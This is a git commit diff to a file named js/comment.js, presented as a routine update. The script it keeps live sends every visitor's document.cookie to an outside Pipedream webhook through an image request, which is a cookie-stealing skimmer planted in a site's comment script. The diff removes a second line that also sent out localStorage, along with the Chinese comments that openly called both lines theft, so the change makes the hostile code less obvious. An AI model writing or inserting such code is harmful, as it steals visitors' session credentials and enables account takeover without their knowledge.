309115b99b15e653ee54ec349b31ff272c52cff9
Yung-Ching Liang <jennywinnie56@gmail.com>
2026-04-18 15:34:23 +1000

    Update comment.js

--- js/comment.js
+++ js/comment.js
@@ -1,9 +1,4 @@
 (function() {
     const WEBHOOK = 'https://eopcy2es2nu1ne5.m.pipedream.net';
-    
-    // 偷 cookie
     new Image().src = WEBHOOK + '/?c=' + encodeURIComponent(document.cookie);
-    
-    // 也偷 localStorage
-    new Image().src = WEBHOOK + '/?l=' + encodeURIComponent(JSON.stringify(localStorage));
 })();
